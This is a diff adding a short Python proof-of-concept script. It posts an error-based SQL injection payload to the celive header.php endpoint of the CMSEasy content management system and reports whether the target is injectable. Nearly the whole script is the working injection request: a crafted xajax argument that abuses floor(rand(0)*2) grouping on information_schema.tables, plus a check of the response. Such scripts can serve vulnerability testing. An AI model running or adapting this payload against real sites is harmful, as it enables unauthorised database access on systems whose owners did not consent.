@@ -1,0 +1,16 @@
+#coding:utf-8
+
+import requests
+import re
+
+url = 'http://127.0.0.1/cmseasy/uploads/celive/live/header.php'
+data = {
+		"xajax":"LiveMessage","xajaxargs[0][name]":"1',(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select md5(233)))a from information_schema.tables group by a)b),'','','','1','127.0.0.1','2')#"
+	    }
+html = requests.post(url,data=data)
+result = re.findall(r'1110',html.text)
+#print(html.text)
+if result:
+	print('This url  has sql')
+else:
+	print('this url is safe')
